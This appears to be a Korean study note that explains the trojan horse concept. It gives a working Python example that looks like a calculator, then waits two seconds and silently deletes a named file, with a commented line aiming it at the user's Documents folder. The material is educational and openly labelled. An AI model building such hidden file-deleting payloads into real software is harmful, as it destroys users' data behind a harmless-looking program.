## **1. 트로이 목마 (Trojan Horse)**

트로이 목마는 겉으로는 유용하거나 무해한 프로그램처럼 보이지만, 실제로는 뒤에서 악의적인 행위를 수행하는 코드입니다. 아래는 간단한 계산기 프로그램처럼 보이지만, 실행 시 특정 파일을 몰래 삭제하는 기본적인 예시입니다.


```python
import os
import time

# --- 악의적인 기능 ---
def malicious_payload():
    """
    숨겨진 악성 행위 (예: 특정 파일 삭제, 정보 유출 시도 등)
    여기서는 'secret_document.txt' 파일을 삭제하는 예시
    """
    target_file = "secret_document.txt"
    # 실제로는 사용자 모르게 특정 경로의 파일을 대상으로 할 수 있음
    # target_path = os.path.join(os.environ['USERPROFILE'], 'Documents', target_file)
    target_path = target_file # 현재 디렉토리에서 실행 예시

    try:
        if os.path.exists(target_path):
            print(f"\n[!] (숨겨진 동작) '{target_path}' 파일을 찾았습니다. 삭제를 시도합니다...")
            os.remove(target_path)
            print(f"[!] (숨겨진 동작) '{target_path}' 파일 삭제 완료.")
        else:
            print(f"\n[!] (숨겨진 동작) '{target_path}' 파일이 존재하지 않습니다.")
    except Exception as e:
        print(f"\n[!] (숨겨진 동작) 파일 삭제 중 오류 발생: {e}")

# --- 겉으로 보이는 정상 기능 ---
def legitimate_calculator():
    """
    사용자에게 보여지는 정상적인 기능 (예: 계산기)
    """
    print("간단한 계산기 프로그램입니다.")
    try:
        num1 = float(input("첫 번째 숫자를 입력하세요: "))
        num2 = float(input("두 번째 숫자를 입력하세요: "))
        result = num1 + num2
        print(f"결과: {num1} + {num2} = {result}")
    except ValueError:
        print("오류: 유효한 숫자를 입력해주세요.")
    except Exception as e:
        print(f"계산 중 오류 발생: {e}")

# --- 메인 실행 로직 ---
if __name__ == "__main__":
    # 1. 겉으로 보이는 정상 기능 실행
    legitimate_calculator()

    # 2. 잠시 후 악의적인 기능 몰래 실행
    print("\n계산기를 종료합니다...")
    time.sleep(2) # 사용자가 눈치채지 못하게 잠시 대기 (선택 사항)

    # 3. 악성 페이로드 실행
    malicious_payload()

    # 4. 프로그램 종료 메시지 (선택 사항)
    # print("\n프로그램을 완전히 종료합니다.")
```

**코드 설명:**

- `legitimate_calculator()`: 사용자에게는 일반적인 계산기 기능처럼 보입니다.
- `malicious_payload()`: 실제 악의적인 동작을 수행하는 함수입니다. 이 예시에서는 현재 디렉토리에 `secret_document.txt` 파일이 있다면 삭제합니다. 실제 트로이 목마는 훨씬 복잡한 경로 탐색, 시스템 정보 탈취, 백도어 설치 등의 기능을 숨길 수 있습니다.
- 메인 로직에서는 먼저 정상적인 계산기 기능을 보여준 후, `malicious_payload()`를 호출하여 숨겨진 악성 행위를 실행합니다.

## 🔗 아웃링크
```dataview
LIST WITHOUT ID outgoing
FROM ""
WHERE file = this.file
FLATTEN file.outlinks as outgoing
WHERE endswith(lower(outgoing.path), ".md")
SORT outgoing ASC
```
## 🔙 백링크
```dataview
LIST WITHOUT ID file.link
WHERE contains(file.outlinks, this.file.link)
SORT file.link ASC
```
